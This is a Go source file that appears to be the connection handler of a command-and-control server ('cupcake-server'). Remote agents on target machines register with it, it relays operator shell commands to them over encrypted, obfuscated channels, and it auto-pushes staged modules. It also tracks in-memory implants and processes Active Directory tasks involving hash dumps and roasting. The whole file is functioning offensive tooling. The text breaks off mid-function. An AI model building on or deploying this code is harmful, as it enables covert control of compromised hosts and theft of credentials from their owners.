package services

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"strings"
	"sync"
	"time"

	"cupcake-server/pkg/globals"
	"cupcake-server/internal/model"
	"cupcake-server/internal/storage"
	"cupcake-server/pkg/utils"

	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"github.com/hashicorp/yamux"
)

// agentLastMigrate tracks last successful session replace per UUID (thrash guard).
var agentLastMigrate sync.Map // uuid -> time.Time

// suppressAgentReconnectThrash is true when a second process is fighting for the
// same agent UUID (Migrating every ~5s). Keep the existing live session.
func suppressAgentReconnectThrash(id string, old *globals.Client) bool {
	if old == nil {
		return false
	}
	last, ok := agentLastMigrate.Load(id)
	if !ok {
		return false
	}
	t, _ := last.(time.Time)
	// Within this window after a migrate, another register is almost always a
	// duplicate agent binary (same UUID seed), not a real host migration.
	if time.Since(t) > 15*time.Second {
		return false
	}
	// Prefer keeping old if Yamux still open (healthy control plane).
	if old.YamuxSession != nil && !old.YamuxSession.IsClosed() {
		return true
	}
	if old.TCPConn != nil {
		return true
	}
	return false
}

func markAgentMigrated(id string) {
	agentLastMigrate.Store(id, time.Now())
}

// resolveAgentSalt prefers per-build kdf_salt from register payload (base64 raw bytes).
func resolveAgentSalt(p map[string]interface{}, fallback string) string {
	if ks, ok := p["kdf_salt"].(string); ok && strings.TrimSpace(ks) != "" {
		if raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(ks)); err == nil && len(raw) > 0 {
			s := string(raw)
			if len(s) > 64 {
				s = s[:64]
			}
			return s
		}
	}
	return fallback
}

// authenticateRegisterProof verifies reg_proof HMAC bound to uuid + session material.
// Bare UUID without a valid proof is always rejected (anti session hijack).
// Returns the derived static session key used for verification when ok.
func authenticateRegisterProof(encryptKey, agentSalt, agentUUID string, payload map[string]interface{}) (sessionKey []byte, ok bool) {
	if strings.TrimSpace(agentUUID) == "" {
		return nil, false
	}
	sessionKey = deriveStaticSessionKey(encryptKey, agentSalt)
	regProof, _ := payload["reg_proof"].(string)
	if !utils.VerifyRegisterProof(sessionKey, agentUUID, regProof) {
		return nil, false
	}
	return sessionKey, true
}

// appendAgentLog appends stdout/stderr lines under LogsMapMu (shared by WS + TCP paths).
func appendAgentLog(clientUUID string, stdout, stderr string) {
	globals.LogsMapMu.Lock()
	defer globals.LogsMapMu.Unlock()
	logs, _ := globals.LogsMap.LoadOrStore(clientUUID, []string{})
	logsArr := logs.([]string)
	if stdout != "" {
		logsArr = append(logsArr, stdout)
	}
	if stderr != "" {
		logsArr = append(logsArr, "[ERR] "+stderr)
	}
	const maxLogsPerAgent = 1000
	if len(logsArr) > maxLogsPerAgent {
		logsArr = logsArr[len(logsArr)-maxLogsPerAgent:]
	}
	globals.LogsMap.Store(clientUUID, logsArr)
}

// relayPendingResponse delivers a response map to a waiting API caller if any.
func relayPendingResponse(reqID string, pMap map[string]interface{}) {
	if reqID == "" {
		return
	}
	if ch, found := globals.PendingResponses.Load(reqID); found {
		select {
		case ch.(chan interface{}) <- pMap:
		default:
		}
	}
}

// deriveStaticSessionKey derives the static AES material matching the Rust agent
// get_aes_key() path (SHA256×100k via DeriveKeyAgent) — NOT Argon2id.
// Noise session keys still take precedence for live traffic via resolveClientSessionKey.
func deriveStaticSessionKey(encryptKey, encryptionSalt string) []byte {
	keyBytes := resolveAESKey(encryptKey)
	saltBytes := make([]byte, 32)
	copy(saltBytes, []byte(encryptionSalt))
	return utils.DeriveKeyAgent(keyBytes, saltBytes)
}

// resolveClientSessionKey returns Noise key if set, else cached SessionKey, else derives once and caches.
func resolveClientSessionKey(client *globals.Client) []byte {
	if client == nil {
		return nil
	}
	if client.NoiseSessionKey != [32]byte{} {
		return client.NoiseSessionKey[:]
	}
	if len(client.SessionKey) == 32 {
		return client.SessionKey
	}
	derived := deriveStaticSessionKey(client.EncryptKey, client.EncryptionSalt)
	client.SessionKey = derived
	return derived
}

// pickSessionKey prefers Noise ephemeral key when non-zero, else static derived key.
// idleReadTimeout is how long the server waits for the next frame after the agent
// is registered. Client adaptive heartbeat can grow to 4× base with Gaussian jitter
// (handler.rs), so a fixed 30s TCP deadline was cutting sessions and forcing reconnect.
// Unregistered / handshake still use a short deadline (caller).
func idleReadTimeout(ln *globals.Listener, registered bool) time.Duration {
	if !registered {
		return 30 * time.Second
	}
	base := 10
	if ln != nil && ln.HeartbeatInterval > 0 {
		base = ln.HeartbeatInterval
	}
	// Client: max idle_multiplier=4, Gaussian can stretch ~+50%; require margin.
	sec := base * 4 * 2 // e.g. base 10 → 80s; base 30 → 240s
	if sec < 120 {
		sec = 120 // floor: always tolerate ≥2 min silence after register
	}
	if sec > 600 {
		sec = 600 // cap 10 min (still anti-slowloris for dead sockets)
	}
	return time.Duration(sec) * time.Second
}

func pickSessionKey(noiseSessionKey [32]byte, staticSessionKey []byte) []byte {
	if noiseSessionKey != [32]byte{} {
		return noiseSessionKey[:]
	}
	return staticSessionKey
}

func ProcessWebSocket(conn *websocket.Conn, remoteAddr string, ln *globals.Listener) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[WS] panic recovered from %s: %v", remoteAddr, r)
		}
	}()

	var clientUUID string
	var client *globals.Client
	done := make(chan struct{})

	defer func() {
		close(done)
		if clientUUID != "" {
			if val, ok := globals.Clients.Load(clientUUID); ok {
				existingClient := val.(*globals.Client)
				if existingClient == client {
					globals.Clients.Delete(clientUUID)
					globals.PTYState.Delete(clientUUID)
					store.UpdateAgentStatus(clientUUID, "offline")
					
					// Notify Offline
					if client != nil {
						NotifyAgentOffline(client.UUID, client.Hostname)
						client.CloseOutputChannel()
					}
				}
			}
		}
		if conn != nil {
			conn.Close()
		}
	}()

	// Start Write Loop only after registration
	startWriteLoop := func(c *globals.Client) {
		go func() {
			for {
				select {
				case <-done:
					return
				case cmdStr, ok := <-c.CommandChannel:
					if !ok {
						return
					}
					
					// Transformation: Wrap raw string from Admin Terminal into strict JSON Command
					msg := globals.MessageWrapper{
						MsgType: "command",
						Payload: globals.CommandPayload{
							CommandType:    "shell",
							CommandContent: cmdStr,
							ReqID:          uuid.New().String(),
						},
					}
					
					if err := WriteEncryptedMessage(c, msg); err != nil {
						log.Printf("Failed to send command to %s: %v", c.UUID, err)
						return
					}
					// Log terminal command (Ignore empty heartbeats/pings)
					if strings.TrimSpace(cmdStr) != "" {
						_ = store.CreateCommandLog(c.UUID, msg.Payload.(globals.CommandPayload).ReqID, "shell", cmdStr)
					}
				}
			}
		}()
	}

	// 🛡️ Anti-DoS: Limit max WebSocket frame size to 50MB to prevent OOM
	conn.SetReadLimit(50 * 1024 * 1024)

	// === Phase 1: Noise v2 ephemeral handshake (X25519 + PSK MAC, 49-byte frames) ===
	// PSK = listener AES base key (resolveAESKey), matching agent get_aes_key_base().
	psk := resolveAESKey(ln.EncryptKey)
	var noiseSessionKey [32]byte
	if len(psk) > 0 {
		conn.SetReadDeadline(time.Now().Add(10 * time.Second))
		_, clientPubKey, err := conn.ReadMessage()
		if err != nil {
			log.Printf("[Noise] WS read failed from %s: %v", remoteAddr, err)
			return
		}
		// Clear upgrade signal for operators still on old agents
		if len(clientPubKey) == 33 && len(clientPubKey) > 0 && clientPubKey[0] == 0x01 {
			log.Printf("[Noise] rejected legacy v1 (33-byte) from %s — rebuild agent for noise v2 (49-byte)", remoteAddr)
			return
		}
		if len(clientPubKey) != utils.NoiseMsgLen {
			log.Printf("[Noise] WS handshake failed from %s: len=%d want %d (v2 pubkey+mac)", remoteAddr, len(clientPubKey), utils.NoiseMsgLen)
			return
		}
		serverResponse, sessionKey, err := utils.NoiseRespond(clientPubKey, psk)
		if err != nil {
			log.Printf("[Noise] WS respond/auth failed from %s: %v", remoteAddr, err)
			return
		}
		if err := conn.WriteMessage(websocket.BinaryMessage, serverResponse); err != nil {
			log.Printf("[Noise] WS response send failed to %s: %v", remoteAddr, err)
			return
		}
		noiseSessionKey = sessionKey
		log.Printf("[Noise] ✅ WS v2 handshake (X25519+PSK-MAC) completed with %s", remoteAddr)
	}

	// Derive static session key ONCE per connection (Argon2id is expensive — never per packet)
	// When Noise succeeded, sessionKey = NoiseSessionKey (never salt-derived static for traffic).
	keyBytes := resolveAESKey(ln.EncryptKey)
	staticSessionKey := deriveStaticSessionKey(ln.EncryptKey, ln.EncryptionSalt)
	sessionKey := pickSessionKey(noiseSessionKey, staticSessionKey)
	fragRe := utils.NewFragReassembler()

	// --- Read Loop ---
	for {
		// After register: timeout tracks agent adaptive heartbeat (not a fixed 60s).
		conn.SetReadDeadline(time.Now().Add(idleReadTimeout(ln, clientUUID != "")))

		messageType, message, err := conn.ReadMessage()
		if err != nil {
			break
		}

		// OpSec Logic: In Base64 mode, we use TextMessage, otherwise Binary
		_ = messageType // Avoid "unused" but informative for debugging

		// Prefer live client-cached key after register (Noise or static)
		if client != nil {
			sessionKey = resolveClientSessionKey(client)
		} else {
			sessionKey = pickSessionKey(noiseSessionKey, staticSessionKey)
		}
		
		useAES := isAESEnabled(ln.EncryptMode) || (strings.TrimSpace(ln.EncryptMode) == "" && len(keyBytes) > 0)

		var plaintext []byte
		if useAES {
			if len(keyBytes) == 0 {
				log.Printf("Encrypted listener missing AES key for %s", remoteAddr)
				break
			}
			// Deobfuscate + decrypt, with CKF1 multi-fragment reassembly
			pt, needMore, err := utils.OpenWire(fragRe, message, ln.ObfuscateMode, sessionKey)
			if err != nil {
				log.Printf("Decryption/reassembly failed for %s: %v", remoteAddr, err)
				break
			}
			if needMore {
				continue
			}
			plaintext = pt
		} else if len(keyBytes) > 0 {
			pt, needMore, err := utils.OpenWire(fragRe, message, ln.ObfuscateMode, sessionKey)
			if err == nil && !needMore {
				plaintext = pt
			} else if needMore {
				continue
			} else {
				plaintext = message
			}
		} else {
			plaintext = message
		}

		// Protocol Adapter: Unmarshal top-level MessageWrapper
		var msg globals.MessageWrapper
		if err := json.Unmarshal(plaintext, &msg); err != nil {
			log.Printf("Failed to unmarshal message: %v", err)
			continue
		}

		switch msg.MsgType {
		case "register":
			p, ok := msg.Payload.(map[string]interface{})
			if !ok {
				log.Printf("Invalid register payload format from %s", remoteAddr)
				continue
			}
			
			id, _ := p["uuid"].(string)
			hostname, _ := p["hostname"].(string)
			os, _ := p["os"].(string)
			username, _ := p["username"].(string)
			arch, _ := p["arch"].(string)
			source, _ := p["source"].(string)
			if source == "" { source = "disk" }

			agentSalt := resolveAgentSalt(p, ln.EncryptionSalt)
			proofKey, authOK := authenticateRegisterProof(ln.EncryptKey, agentSalt, id, p)
			if !authOK {
				log.Printf("[WS] register rejected (missing/invalid reg_proof) uuid=%q from %s", id, remoteAddr)
				continue
			}
			staticSessionKey = append([]byte(nil), proofKey...)

			// Determine status based on source
			status := "online"
			if source == "memory" {
				status = "memory_online"
			}

			// ⚡️ CRITICAL FIX: Upsert Agent to Database immediately
			agentDBModel := &model.Agent{
				UUID:      id,
				Hostname:  hostname,
				IP:        remoteAddr,
				OS:        os,
				Username:  username,
				Arch:      arch,
				Status:    status,
				LastSeen:  time.Now(),
				EncryptionSalt:  agentSalt,
				ObfuscationMode: ln.ObfuscateMode,
			}

			if err := store.SaveAgent(agentDBModel); err != nil {
				log.Printf("[DB] Failed to persist agent %s: %v", id, err)
			}

			client = &globals.Client{
				WebSocketConn:   conn,
				Transport:       "websocket",
				UUID:            id,
				Hostname:        hostname,
				OS:              os,
				Arch:            arch,
				Username:        username,
				IP:              remoteAddr,
				EncryptMode:     ln.EncryptMode,
				EncryptKey:      ln.EncryptKey,
				EncryptionSalt:  agentSalt,
				ObfuscateMode:   ln.ObfuscateMode,
				NoiseSessionKey: noiseSessionKey,
				SessionKey:      append([]byte(nil), staticSessionKey...),
				CommandChannel:  make(chan string, 10),
				OutputChannel:   make(chan string, 256),
				ListenerID:      ln.ID,
				ListenerPort:    ln.Port,
				CachedPlugins:   make(map[string]bool),
			}
			clientUUID = id

			globals.Clients.Store(id, client)

			// Notify Online
			NotifyAgentOnline(client.UUID, client.Hostname, client.IP, client.OS, client.Username)

			// Start the write loop now that the client is registered
			startWriteLoop(client)

		case "response":
			pMap, ok := msg.Payload.(map[string]interface{})
			if !ok {
				log.Printf("Invalid response payload format")
				continue
			}

			var resp globals.ResponsePayload
			if so, ok := pMap["stdout"].(string); ok { resp.Stdout = so }
			if se, ok := pMap["stderr"].(string); ok { resp.Stderr = se }
			if pa, ok := pMap["path"].(string); ok { resp.Path = pa }
			if req, ok := pMap["req_id"].(string); ok { resp.ReqID = req }

			// Stage0: auto-push L2 module when agent reports module_required:<id>
			if client != nil && resp.Stderr != "" && strings.Contains(resp.Stderr, "module_required:") {
				go MaybeAutoPushModule(client.UUID, resp.Stderr)
			}

			// Broadcast: Format output and send to Client.OutputChannel (Real-time Terminal)
			if client != nil && client.OutputChannel != nil {
// Persistence: Update Output Log
					if resp.ReqID != "" {
						// ✅ V3.0.1 Quiet Heartbeat: 忽略周期生存 ping（不写日志，防止滚屏）
						if resp.ReqID == "heartbeat" {
							continue
						}
						go func() {
							// AD tasks: never persist full hash dumps / large roast bodies in CommandLog.
							logStdout := resp.Stdout
							if strings.HasPrefix(resp.ReqID, "AD") {
								logStdout = SanitizeSummaryForLog(resp.Stdout)
							}
							store.UpdateCommandOutput(resp.ReqID, logStdout, resp.Stderr)
							// Route AD responses to the AD task handler (uses own sanitize for AdTask)
							HandleAdResponse(resp.ReqID, resp.Stdout, resp.Stderr)
						}()
					}

				output := resp.Stdout
				// 🛡️ NOISE FILTER: If output looks like JSON, don't send to terminal (likely raw data for internal modules)
				isJSON := len(output) > 2 && (output[0] == '[' || output[0] == '{')

				doneToken := "__CUPCAKE_DONE__"
				ptyDone := false
				if strings.Contains(output, doneToken) {
					ptyDone = true
					output = strings.ReplaceAll(output, doneToken, "")
				}
				if strings.Contains(resp.Stderr, doneToken) {
					ptyDone = true
					resp.Stderr = strings.ReplaceAll(resp.Stderr, doneToken, "")
				}
				if strings.TrimSpace(output) == "" {
					output = ""
				}
				
				if output == "" && resp.Stderr != "" {
					output = fmt.Sprintf("[ERR] %s", resp.Stderr)
				} else if resp.Stderr != "" && !isJSON {
					output = fmt.Sprintf("%s\n[ERR] %s", output, resp.Stderr)
				}
				
				if output != "" {
					if strings.Contains(output, "Interactive shell session ended") {
						globals.PTYState.Delete(clientUUID)
					}
					// ⚡️ Enhancement: Internal JSON wrap for TaskID support in real-time console
					internalMsg := struct {
						TaskID  string `json:"task_id"`
						Type    string `json:"type"`
						Content string `json:"content"`
					}{
						TaskID:  resp.ReqID,
						Type:    "TERM",
						Content: output,
					}
					if isJSON {
						internalMsg.Type = "JSON_DATA"
					}
					
					jsonOut, _ := json.Marshal(internalMsg)
					trySendOutput(client, string(jsonOut))
				}
				if ptyDone {
					doneMsg := struct {
						TaskID  string `json:"task_id"`
						Type    string `json:"type"`
						Content string `json:"content"`
					}{
						TaskID:  resp.ReqID,
						Type:    "PTY_DONE",
						Content: "",
					}
					jsonOut, _ := json.Marshal(doneMsg)
					trySendOutput(client, string(jsonOut))
				}
			}

			// Sync-Async Bridge + legacy log buffer (shared helpers for WS/TCP)
			if reqID, ok := pMap["req_id"].(string); ok {
				relayPendingResponse(reqID, pMap)
			}
			appendAgentLog(clientUUID, resp.Stdout, resp.Stderr)
		}
	}
}

// ProcessTCPConnection handles raw TCP or Yamux multiplexed control streams
// performTCPNoiseHandshake reads the first length-prefixed TCP frame.
// Noise v2: len == utils.NoiseMsgLen (49) → ECDH + PSK MAC; fail-closed on auth error.
// Legacy v1 33-byte frames are rejected (agent/server hard-cut to v2).
// Non-noise first frames (other lengths) return as application body when encryption is off/misaligned.
// On I/O or hard failure returns a non-nil error (caller should close).
func performTCPNoiseHandshake(conn net.Conn, psk []byte, remoteAddr string) (sessionKey [32]byte, firstApp []byte, err error) {
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	header := make([]byte, 4)
	if _, rerr := io.ReadFull(conn, header); rerr != nil {
		return sessionKey, nil, rerr
	}
	length := binary.BigEndian.Uint32(header)
	if length == 0 {
		return sessionKey, nil, fmt.Errorf("empty first frame")
	}
	if length > 50*1024*1024 {
		return sessionKey, nil, fmt.Errorf("first frame too large: %d", length)
	}
	body := make([]byte, length)
	if _, rerr := io.ReadFull(conn, body); rerr != nil {
		return sessionKey, nil, rerr
	}
	conn.SetReadDeadline(time.Time{})

	// Hard reject legacy Noise v1 (33-byte, version 0x01) so operators see a clear upgrade signal.
	if length == 33 && len(body) == 33 && body[0] == 0x01 {
		return sessionKey, nil, fmt.Errorf("legacy noise v1 (33-byte) rejected from %s; rebuild agent for noise v2 (49-byte + PSK MAC)", remoteAddr)
	}

	if length == uint32(utils.NoiseMsgLen) {
		if len(psk) == 0 {
			return sessionKey, nil, fmt.Errorf("noise v2 frame from %s but listener PSK empty", remoteAddr)
		}
		serverResponse, sk, nerr := utils.NoiseRespond(body, psk)
		if nerr != nil {
			// Fail-closed: wrong PSK / bad MAC must not fall through as plaintext app data.
			return sessionKey, nil, fmt.Errorf("noise v2 auth failed from %s: %w", remoteAddr, nerr)
		}
		respHeader := make([]byte, 4)
		binary.BigEndian.PutUint32(respHeader, uint32(len(serverResponse)))
		if _, werr := conn.Write(respHeader); werr != nil {
			return sessionKey, nil, werr
		}
		if _, werr := conn.Write(serverResponse); werr != nil {
			return sessionKey, nil, werr
		}
		log.Printf("[Noise] ✅ TCP v2 handshake (X25519+PSK-MAC) completed with %s", remoteAddr)
		return sk, nil, nil
	}

	// First frame is already an application message (e.g. encryption disabled path)
	return sessionKey, body, nil
}

func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener, session interface{}) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[TCP] panic recovered from %s: %v", remoteAddr, r)
		}
	}()

	var clientUUID string
	var client *globals.Client
	done := make(chan struct{})

	defer func() {
		close(done)
		if clientUUID != "" {
			// ⚡ SAFETY CHECK: Only delete if the client in the map is actually this specific instance.
			// This prevents a stale/dying connection from removing a newer, active session for the same agent.
			if val, ok := globals.Clients.Load(clientUUID); ok {
				existingClient := val.(*globals.Client)
				if existingClient == client {
					globals.Clients.Delete(clientUUID)
					// Check current DB status to determine correct offline status
					offlineStatus := "offline"
					if agent, err := store.GetAgent(clientUUID); err == nil && agent != nil {
						if agent.Status == "memory_online" {
							offlineStatus = "memory_offline"
						}
					}
					store.UpdateAgentStatus(clientUUID, offlineStatus)
					log.Printf("\x1b[31m[-] Agent Offline\x1b[0m %s", clientUUID)
					if client != nil {
						NotifyAgentOffline(client.UUID, client.Hostname)
					}
					if client != nil {
						client.CloseOutputChannel()
					}
				}
			}
		}
		conn.Close()
		if session != nil {
			if s, ok := session.(io.Closer); ok {
				s.Close()
			}
		}
	}()
// ... rest of logic remains same but uses 'conn' (which is the stream)

	startWriteLoop := func(c *globals.Client) {
		go func() {
			for {
				select {
				case <-done:
					return
				case cmdStr, ok := <-c.CommandChannel:
					if !ok { return }
					msg := globals.MessageWrapper{
						MsgType: "command",
						Payload: globals.CommandPayload{
							CommandType:    "shell",
							CommandContent: cmdStr,
							ReqID:          uuid.New().String(),
						},
					}
					if err := WriteEncryptedMessage(c, msg); err != nil {
						return
					}
					// Log terminal command (Ignore empty heartbeats/pings)
					if strings.TrimSpace(cmdStr) != "" {
						_ = store.CreateCommandLog(c.UUID, msg.Payload.(globals.CommandPayload).ReqID, "shell", cmdStr)
					}
				}
			}
		}()
	}

	// Connection accepted silently — derive static key once; Noise handshake runs once before the loop.
	var noiseSessionKey [32]byte
	keyBytes := resolveAESKey(ln.EncryptKey)
	staticSessionKey := deriveStaticSessionKey(ln.EncryptKey, ln.EncryptionSalt)
	tcpFragRe := utils.NewFragReassembler()

	// First frame: Noise handshake (if PSK set) OR first application message.
	var pendingBody []byte
	if len(keyBytes) > 0 {
		sk, firstApp, err := performTCPNoiseHandshake(conn, keyBytes, remoteAddr)
		if err != nil {
			log.Printf("[Noise] TCP handshake failed from %s: %v", remoteAddr, err)
			return
		}
		noiseSessionKey = sk
		pendingBody = firstApp
	}

	for {
		var body []byte
		if pendingBody != nil {
			body = pendingBody
			pendingBody = nil
		} else {
			// Pre-register: 30s (handshake/register). Post-register: ≥120s so adaptive
			// heartbeat (up to 4× base + jitter) does not thrash Online/Offline.
			conn.SetReadDeadline(time.Now().Add(idleReadTimeout(ln, clientUUID != "")))

			// 1. Read Header (4 bytes length)
			header := make([]byte, 4)
			if _, err := io.ReadFull(conn, header); err != nil {
				// Normal disconnect / idle timeout — don't spam logs
				break
			}
			length := binary.BigEndian.Uint32(header)
			if length == 0 {
				continue
			}

			// 🛡️ Anti-DoS: Limit max frame size to 50MB
			if length > 50*1024*1024 {
				log.Printf("[TCP] Frame too large (%d bytes), closing connection for safety", length)
				break
			}

			// 🛡️ Anti-Slowloris: Set deadline based on payload size
			conn.SetReadDeadline(time.Now().Add(120 * time.Second))

			// 2. Read Body
			body = make([]byte, length)
			if _, err := io.ReadFull(conn, body); err != nil {
				log.Printf("[TCP] Failed to read body from %s (declared %d bytes): %v", remoteAddr, length, err)
				break
			}
		}

		sessionKey := pickSessionKey(noiseSessionKey, staticSessionKey)
		if client != nil {
			sessionKey = resolveClientSessionKey(client)
		}
		
		useAES := isAESEnabled(ln.EncryptMode) || (strings.TrimSpace(ln.EncryptMode) == "" && len(keyBytes) > 0)
		
		var plaintext []byte
		if useAES {
			if len(keyBytes) == 0 {
				log.Printf("[TCP] Encrypted listener missing AES key")
				break
			}
			pt, needMore, err := utils.OpenWire(tcpFragRe, body, ln.ObfuscateMode, sessionKey)
			if err != nil {
				log.Printf("[TCP] Decryption/reassembly failed from %s: body=%d key_len=%d err=%v",
					remoteAddr, len(body), len(sessionKey), err)
				break
			}
			if needMore {
				continue
			}
			plaintext = pt
		} else if len(keyBytes) > 0 {
			pt, needMore, err := utils.OpenWire(tcpFragRe, body, ln.ObfuscateMode, sessionKey)
			if err == nil && !needMore {
				plaintext = pt
			} else if needMore {
				continue
			} else {
				log.Printf("[TCP] Auto-detect decrypt failed from %s: body=%d err=%v", remoteAddr, len(body), err)
				plaintext = body
			}
		} else {
			plaintext = body
		}

		var msg globals.MessageWrapper
		if err := json.Unmarshal(plaintext, &msg); err != nil {
			log.Printf("[TCP] JSON Unmarshal Failed for Agent %s: %v", remoteAddr, err)
			log.Printf("[TCP] Raw Payload: %s", string(plaintext))
			continue
		}

		switch msg.MsgType {
		case "register":
			p, ok := msg.Payload.(map[string]interface{})
			if !ok {
				continue
			}
			id, _ := p["uuid"].(string)
			hostname, _ := p["hostname"].(string)
			os, _ := p["os"].(string)
			username, _ := p["username"].(string)
			arch, _ := p["arch"].(string)
			source, _ := p["source"].(string)
			if source == "" { source = "disk" }
			agentSalt := resolveAgentSalt(p, ln.EncryptionSalt)
			proofKey, authOK := authenticateRegisterProof(ln.EncryptKey, agentSalt, id, p)
			if !authOK {
				log.Printf("[TCP] register rejected (missing/invalid reg_proof) uuid=%q from %s", id, remoteAddr)
				continue
			}
			staticSessionKey = append([]byte(nil), proofKey...)

			// Determine status based on source
			status := "online"
			if source == "memory" {
				status = "memory_online"
			}

			// 🚨 V3.0.1 Robustness: Close old connection if this agent is re-registering
			// ⚡ FIX: Store new client BEFORE closing old connection to prevent race condition
			// where old connection's defer marks the agent offline after new one registers.

			// Save reference to old client before overwriting
			var oldClient *globals.Client
			if oldVal, ok := globals.Clients.Load(id); ok {
				oldClient = oldVal.(*globals.Client)
			}

			var ySession *yamux.Session
			if s, ok := session.(*yamux.Session); ok {
				ySession = s
			}

			// Thrash guard: two agent processes with the same UUID will reconnect
			// every few seconds (Migrating A→B→A…). That aborts file_upload_chunk
			// and freezes the UI progress bar. If we just migrated and the previous
			// session still looks alive, drop the NEW connection instead.
			if oldClient != nil {
				if suppressAgentReconnectThrash(id, oldClient) {
					log.Printf("\x1b[33m[~] Agent thrash suppressed\x1b[0m %s: dropping new conn %s (keep existing session — kill duplicate agent process on target)",
						id, remoteAddr)
					if ySession != nil {
						_ = ySession.Close()
					}
					_ = conn.Close()
					// Do not bind this handler to the agent UUID (defer must not offline the real one).
					clientUUID = ""
					client = nil
					return
				}
			}

			client = &globals.Client{
				TCPConn:         conn,
				YamuxSession:    ySession,
				Transport:       "tcp",
				UUID:            id,
				Hostname:        hostname,
				OS:              os,
				Arch:            arch,
				Username:        username,
				IP:              remoteAddr,
				EncryptMode:     ln.EncryptMode,
				EncryptKey:      ln.EncryptKey,
				EncryptionSalt:  agentSalt,
				ObfuscateMode:   ln.ObfuscateMode,
				NoiseSessionKey: noiseSessionKey,
				SessionKey:      append([]byte(nil), staticSessionKey...),
				CommandChannel:  make(chan string, 64),
				OutputChannel:   make(chan string, 256),
				ListenerID:      ln.ID,
				ListenerPort:    ln.Port,
				CachedPlugins:   make(map[string]bool),
			}
			clientUUID = id

			// Store new client FIRST (so old defer's equality check fails)
			globals.Clients.Store(id, client)

			// NOW close old connection safely
			if oldClient != nil && oldClient != client {
				markAgentMigrated(id)
				log.Printf("\x1b[33m[~] Agent Migrating\x1b[0m %s → %s", id, remoteAddr)
				if oldClient.TCPConn != nil {
					oldClient.TCPConn.Close()
				}
				if oldClient.YamuxSession != nil {
					oldClient.YamuxSession.Close()
				}
				oldClient.CloseOutputChannel()
			}

			// ⚡️ Upsert Agent to Database
			agentDBModel := &model.Agent{
				UUID:            id,
				Hostname:        hostname,
				IP:              remoteAddr,
				OS:              os,
				Username:        username,
				Arch:            arch,
				Status:          status,
				LastSeen:        time.Now(),
				EncryptionSalt:  agentSalt,
				ObfuscationMode: ln.ObfuscateMode,
			}
			
			if err := store.SaveAgent(agentDBModel); err != nil {
				log.Printf("[DB] Failed to persist TCP agent %s: %v", id, err)
			}

			log.Printf("\x1b[32m[+] Agent Online\x1b[0m %s @ %s (source: %s)", id, remoteAddr, source)
			NotifyAgentOnline(client.UUID, client.Hostname, client.IP, client.OS, client.Username)
			startWriteLoop(client)

		case "response":
			pMap, ok := msg.Payload.(map[string]interface{})
			if !ok {
				continue
			}

			var resp globals.ResponsePayload
			if so, ok := pMap["stdout"].(string); ok { resp.Stdout = so }
			if se, ok := pMap["stderr"].(string); ok { resp.Stderr = se }
			if pa, ok := pMap["path"].(string); ok { resp.Path = pa }
			if req, ok := pMap["req_id"].(string); ok { resp.ReqID = req }

			if client != nil && resp.Stderr != "" && strings.Contains(resp.Stderr, "module_required:") {
				go MaybeAutoPushModule(client.UUID, resp.Stderr)
			}

			if client != nil && client.OutputChannel != nil {
				if resp.ReqID != "" {
					// ⚡️ V3.0.1 Quiet Heartbeat: Ignore periodic survival pings in DB logs
					if resp.ReqID == "heartbeat" {
						continue
					}
					go func() {
						logStdout := resp.Stdout
						if strings.HasPrefix(resp.ReqID, "AD") {
							logStdout = SanitizeSummaryForLog(resp.Stdout)
						}
						store.UpdateCommandOutput(resp.ReqID, logStdout, resp.Stderr)
						// Only AD-* correlation IDs can ever be ad_tasks. Guard here too
						// to avoid pointless DB lookups and "record not found" noise.
						if strings.HasPrefix(resp.ReqID, "AD-") {
							HandleAdResponse(resp.ReqID, resp.Stdout, resp.Stderr)
						}
					}()
					// Response handled silently
				}
				output := resp.Stdout
				if output == "" && resp.Stderr != "" {
					output = "[ERR] " + resp.Stderr
				}
				if output != "" {
					trySendOutput(client, output)
				}
			}

			if reqID, ok := pMap["req_id"].(string); ok {
				relayPendingResponse(reqID, pMap)
			}
			if so, se := "", ""; true {
				if v, ok := pMap["stdout"].(string); ok {
					so = v
				}
				if v, ok := pMap["stderr"].(string); ok {
					se = v
				}
				appendAgentLog(clientUUID, so, se)
			}
		}
	}
}

// trySendOutput non-blocking send; race-safe with CloseOutputChannel; counts drops.
func trySendOutput(client *globals.Client, msg string) {
	if client == nil {
		return
	}
	if client.TrySendOutput(msg) {
		return
	}
	// rate-limit noise: log only every 64th drop per agent
	n := client.DroppedOutputs.Load()
	if n > 0 && n%64 == 0 {
		log.Printf("[Output] dropped_outputs agent=%s n=%d global=%d",
			client.UUID, n, globals.GlobalDroppedOutputs.Load())
	}
}

// WriteEncryptedMessage is a helper to encrypt and send JSON messages to any transport
func WriteEncryptedMessage(client *globals.Client, msg interface{}) error {
	// Remember non-module commands so module_required can auto-retry after stage
	if client != nil {
		var mw *globals.MessageWrapper
		switch m := msg.(type) {
		case globals.MessageWrapper:
			mw = &m
		case *globals.MessageWrapper:
			mw = m
		}
		if mw != nil && mw.MsgType == "command" {
			if cp, ok := mw.Payload.(globals.CommandPayload); ok {
				RememberCommandForModuleRetry(client.UUID, cp)
			}
		}
	}

	data, err := json.Marshal(msg)
	if err != nil {
		return err
	}

	keyBytes := resolveAESKey(client.EncryptKey)
	// Use cached/Noise session key — never re-run Argon2id on the hot path
	sessionKey := resolveClientSessionKey(client)
	
	useAES := isAESEnabled(client.EncryptMode) || (strings.TrimSpace(client.EncryptMode) == "" && len(keyBytes) > 0)

	var payload []byte
	if useAES {
		if len(keyBytes) == 0 {
			return fmt.Errorf("encrypt mode enabled but AES key is empty")
		}
		
		// 1. Encrypt
		encrypted, err := utils.EncryptAES(data, sessionKey)
		if err != nil {
			return err
		}
		
		// 2. Obfuscate
		payload = utils.ObfuscatePacket(encrypted, client.ObfuscateMode, sessionKey)
	} else {
		payload = data
	}

	if client.Transport == "websocket" {
		msgType := websocket.BinaryMessage
		if strings.ToLower(client.ObfuscateMode) == "base64" {
			msgType = websocket.TextMessage
		}
		// Serialize concurrent WebSocket writers (startWriteLoop + other senders)
		client.WSWriteMu.Lock()
		defer client.WSWriteMu.Unlock()
		return client.WebSocketConn.WriteMessage(msgType, payload)
	} else if client.Transport == "tcp" {
		// 🐛 互斥锁防止与 startWriteLoop 并发写导致消息错位
		client.TCPWriteMu.Lock()
